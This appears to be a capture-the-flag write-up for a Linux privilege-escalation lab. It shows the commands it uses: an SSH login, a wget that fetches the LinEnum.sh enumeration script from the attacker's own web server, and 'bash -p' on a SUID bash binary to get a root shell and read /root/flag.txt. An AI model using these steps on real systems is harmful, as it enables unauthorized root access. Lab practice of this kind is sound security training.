<body><div class="page"><h1 class="title">Task 16 [Day 11] Networking The Rogue Gnome</h1><br/><strong>What type of privilege escalation involves using a user account to execute commands as an administrator?</strong><br />-Vertical<br /><br /><strong>What is the name of the file that contains a list of users who are a part of the </strong><strong><code>sudo</code></strong><strong> group?</strong><br />-sudoers<br /><br /><strong>Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of </strong><a href="https://gtfobins.github.io/">GTFObins</a><strong> and your researching skills to learn how to exploit this binary.</strong><br />1. Login via SSH <code>ssh cmnatic@10.10.202.106</code> password “aoc2020”<br />2. whoami -&gt; we are logged in as user “cmnatic”<br />3. sudo cat /etc/sudoers -&gt; cnmatic is not in the sudoers file<br />4. downloaded LinEnum.sh<br />5. Started a local webserver in the same directory that contains LinEnum.sh using <code>python3 -m http.server 8080</code><br />   1) Used wget 10.9.237.36:8080/LinEnum.sh<br />   2) This is needed because the vulnerable box on THM is not connected to the internet<br />6. LinEnum finds that bash has the SUID bit set. It's a shell and facilitates the execution of many commands. Therefore it's certainly an interesting binary.<br />7. gtfobins.github.io/gtfobins/bash/#suid<br />   1) This section explains that bash can be executed with the -p flag. This allows us to start a new shell in privileged mode. Nomarlly the effective user ID is set to the real user ID, but -p allows us to keep the effective user ID  it is launched with. Since root owns this binary we get to keep using root's effective ID.<br /><br /><br /><strong>What are the contents of the file located at /root/flag.txt?</strong><br />1. bash -p<br />2. cat /root/flag.txt</div></body></html>
